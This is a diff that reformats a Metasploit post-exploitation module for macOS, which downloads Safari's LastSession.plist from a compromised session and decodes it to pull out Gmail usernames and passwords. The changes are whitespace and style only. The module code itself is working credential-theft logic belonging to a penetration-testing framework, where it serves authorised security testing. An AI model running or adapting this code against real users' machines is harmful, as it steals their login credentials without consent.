@@ -8,31 +8,32 @@ require 'rexml/document'
 class MetasploitModule < Msf::Post
   include Msf::Post::File
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'OSX Gather Safari LastSession.plist',
-      'Description'   => %q{
-        This module downloads the LastSession.plist file from the target machine.
-        LastSession.plist is used by Safari to track active websites in the current session,
-        and sometimes contains sensitive information such as usernames and passwords.
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'OSX Gather Safari LastSession.plist',
+        'Description' => %q{
+          This module downloads the LastSession.plist file from the target machine.
+          LastSession.plist is used by Safari to track active websites in the current session,
+          and sometimes contains sensitive information such as usernames and passwords.
 
-        This module will first download the original LastSession.plist, and then attempt
-        to find the credential for Gmail. The Gmail's last session state may contain the
-        user's credential if his/her first login attempt failed (likely due to a typo),
-        and then the page got refreshed or another login attempt was made. This also means
-        the stolen credential might contain typos.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'sinn3r'],
-      'Platform'      => [ 'osx' ],
-      'SessionTypes'  => [ 'meterpreter','shell' ],
-      'References'    =>
-        [
+          This module will first download the original LastSession.plist, and then attempt
+          to find the credential for Gmail. The Gmail's last session state may contain the
+          user's credential if his/her first login attempt failed (likely due to a typo),
+          and then the page got refreshed or another login attempt was made. This also means
+          the stolen credential might contain typos.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'sinn3r'],
+        'Platform' => [ 'osx' ],
+        'SessionTypes' => [ 'meterpreter', 'shell' ],
+        'References' => [
           ['URL', 'http://www.securelist.com/en/blog/8168/Loophole_in_Safari']
         ]
-    ))
+      )
+    )
   end
-
 
   #
   # Returns the Safari version based on version.plist
@@ -66,7 +67,6 @@ class MetasploitModule < Msf::Post
     read_file(filename)
   end
 
-
   #
   # Returns the XML version of LastSession.plist (text file)
   # Just a wrapper for plutil
@@ -75,7 +75,6 @@ class MetasploitModule < Msf::Post
     print_status("#{peer} - Looking for LastSession.plist")
     plutil("#{expand_path("~")}/Library/Safari/LastSession.plist")
   end
-
 
   #
   # Returns the <array> element that contains session data
@@ -104,7 +103,6 @@ class MetasploitModule < Msf::Post
     session_dict
   end
 
-
   #
   # Returns the <dict> session element
   # @param xml [REXML::Element] The array element for the session data
@@ -130,7 +128,6 @@ class MetasploitModule < Msf::Post
     dict
   end
 
-
   #
   # Extracts Gmail username/password
   # @param xml [REXML::Element] The array element for the session data
@@ -144,7 +141,7 @@ class MetasploitModule < Msf::Post
     raw_data = gmail_dict.elements['array/dict/data'].text
     decoded_data = Rex::Text.decode_base64(raw_data)
     cred = decoded_data.scan(/Email=(.+)&Passwd=(.+)\&signIn/).flatten
-    user, pass = cred.map {|data| Rex::Text.uri_decode(data)}
+    user, pass = cred.map { |data| Rex::Text.uri_decode(data) }
 
     return '' if user.blank? or pass.blank?
 
@@ -156,8 +153,8 @@ class MetasploitModule < Msf::Post
   #
   def run
     cred_tbl = Rex::Text::Table.new({
-      'Header'  => 'Credentials',
-      'Indent'  => 1,
+      'Header' => 'Credentials',
+      'Indent' => 1,
       'Columns' => ['Domain', 'Username', 'Password']
     })
 
@@ -173,9 +170,9 @@ class MetasploitModule < Msf::Post
       print_good("#{peer} - LastSession.plist stored in: #{p.to_s}")
     end
 
-    #
-    # If this is an unpatched version, we try to extract creds
-    #
+#
+# If this is an unpatched version, we try to extract creds
+#
 =begin
     version = get_safari_version
     if version.blank?
